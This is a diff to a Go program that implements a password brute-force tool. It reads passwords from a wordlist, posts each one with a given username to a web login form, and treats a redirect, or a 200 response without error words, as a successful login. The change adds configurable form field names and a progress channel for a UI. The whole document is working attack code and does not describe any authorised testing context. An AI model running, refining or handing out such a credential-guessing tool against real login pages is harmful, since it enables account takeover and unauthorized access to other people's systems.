@@ -11,6 +11,15 @@ import (
 	"time"
 )
 
+type AttackConfig struct {
+	TargetURL    string
+	Username     string
+	Wordlist     string
+	UserField    string // default "username"
+	PassField    string // default "password"
+	SuccessRegex string // optional
+}
+
 type AttackProgressMsg struct {
 	AttemptCount int
 	Password     string
@@ -19,86 +28,11 @@ type AttackProgressMsg struct {
 	ErrorMsg     string
 }
 
-func RunBruteForce(targetURL, username, wordlist string) {
-	fmt.Println("Starting brute force attack tool...")
-	fmt.Printf("Target: %s\n", targetURL)
-	fmt.Printf("Username: %s\n", username)
-	fmt.Printf("Wordlist: %s\n", wordlist)
+func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg) {
+	if config.UserField == "" { config.UserField = "username" }
+	if config.PassField == "" { config.PassField = "password" }
 
-	file, err := os.Open(wordlist)
-	if err != nil {
-		fmt.Printf("Error opening wordlist: %v\n", err)
-		return
-	}
-	defer file.Close()
-
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return nil
-		},
-	}
-
-	scanner := bufio.NewScanner(file)
-	attemptCount := 0
-	for scanner.Scan() {
-		password := strings.TrimSpace(scanner.Text())
-		if password == "" {
-			continue
-		}
-		attemptCount++
-
-		fmt.Printf("\rAttempt %d: Trying password '%s'...", attemptCount, password)
-
-		data := url.Values{}
-		data.Set("username", username)
-		data.Set("password", password)
-
-		req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
-		if err != nil {
-			fmt.Printf("\n[!] Error creating request: %v\n", err)
-			continue
-		}
-		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-
-		resp, err := client.Do(req)
-		if err != nil {
-			fmt.Printf("\n[!] Request failed: %v\n", err)
-			continue
-		}
-
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-
-		finalURL := resp.Request.URL.String()
-		isSuccess := false
-
-		if finalURL != targetURL && resp.StatusCode >= 200 && resp.StatusCode < 300 {
-			isSuccess = true
-		} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
-			isSuccess = true
-		} else if resp.StatusCode == 200 && !strings.Contains(strings.ToLower(string(bodyBytes)), "incorrect") && !strings.Contains(strings.ToLower(string(bodyBytes)), "invalid") && !strings.Contains(strings.ToLower(string(bodyBytes)), "failed") {
-			if finalURL != targetURL {
-				isSuccess = true
-			}
-		}
-
-		if isSuccess {
-			fmt.Printf("\n[+] SUCCESS! Password found: %s\n", password)
-			fmt.Printf("[+] Final URL reached: %s (Status: %d)\n", finalURL, resp.StatusCode)
-			return
-		}
-	}
-
-	if err := scanner.Err(); err != nil {
-		fmt.Printf("\nError reading wordlist: %v\n", err)
-	}
-
-	fmt.Printf("\n[-] Attack finished. Password not found.\n")
-}
-
-func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- AttackProgressMsg) {
-	file, err := os.Open(wordlist)
+	file, err := os.Open(config.Wordlist)
 	if err != nil {
 		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
 		return
@@ -108,7 +42,7 @@ func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- Att
 	client := &http.Client{
 		Timeout: 10 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return nil
+			return http.ErrUseLastResponse
 		},
 	}
 
@@ -116,9 +50,7 @@ func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- Att
 	attemptCount := 0
 	for scanner.Scan() {
 		password := strings.TrimSpace(scanner.Text())
-		if password == "" {
-			continue
-		}
+		if password == "" { continue }
 		attemptCount++
 
 		updateChan <- AttackProgressMsg{
@@ -128,19 +60,15 @@ func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- Att
 		}
 
 		data := url.Values{}
-		data.Set("username", username)
-		data.Set("password", password)
+		data.Set(config.UserField, config.Username)
+		data.Set(config.PassField, password)
 
-		req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
-		if err != nil {
-			continue
-		}
+		req, err := http.NewRequest("POST", config.TargetURL, strings.NewReader(data.Encode()))
+		if err != nil { continue }
 		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 
 		resp, err := client.Do(req)
-		if err != nil {
-			continue
-		}
+		if err != nil { continue }
 
 		bodyBytes, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
@@ -148,12 +76,13 @@ func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- Att
 		finalURL := resp.Request.URL.String()
 		isSuccess := false
 
-		if finalURL != targetURL && resp.StatusCode >= 200 && resp.StatusCode < 300 {
+		// Success detection: Redirect or 200 without error words
+		if resp.StatusCode == 302 || resp.StatusCode == 301 {
 			isSuccess = true
-		} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
-			isSuccess = true
-		} else if resp.StatusCode == 200 && !strings.Contains(strings.ToLower(string(bodyBytes)), "incorrect") && !strings.Contains(strings.ToLower(string(bodyBytes)), "invalid") && !strings.Contains(strings.ToLower(string(bodyBytes)), "failed") {
-			if finalURL != targetURL {
+			finalURL = resp.Header.Get("Location")
+		} else if resp.StatusCode == 200 {
+			bodyStr := strings.ToLower(string(bodyBytes))
+			if !strings.Contains(bodyStr, "incorrect") && !strings.Contains(bodyStr, "invalid") && !strings.Contains(bodyStr, "failed") {
 				isSuccess = true
 			}
 		}
@@ -176,3 +105,17 @@ func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- Att
 
 	updateChan <- AttackProgressMsg{Status: "Failed"}
 }
+
+func RunBruteForce(config AttackConfig) {
+	updateChan := make(chan AttackProgressMsg)
+	go RunBruteForceUI(config, updateChan)
+	for msg := range updateChan {
+		if msg.Status == "Running" {
+			fmt.Printf("\rAttempt %d: Trying %s...", msg.AttemptCount, msg.Password)
+		} else if msg.Status == "Success" {
+			fmt.Printf("\n[+] SUCCESS! Password: %s\n", msg.Password)
+			return
+		}
+	}
+}
+
